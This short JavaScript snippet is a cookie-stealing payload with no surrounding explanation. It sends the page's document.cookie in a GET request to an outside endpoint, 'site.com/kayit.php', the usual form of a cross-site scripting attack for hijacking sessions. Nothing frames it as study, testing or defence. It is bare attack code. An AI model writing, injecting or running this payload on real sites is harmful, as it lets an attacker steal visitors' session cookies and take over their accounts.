var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", 'https://site.com/kayit.php?cookie='+document.cookie);
xmlHttp.send(null);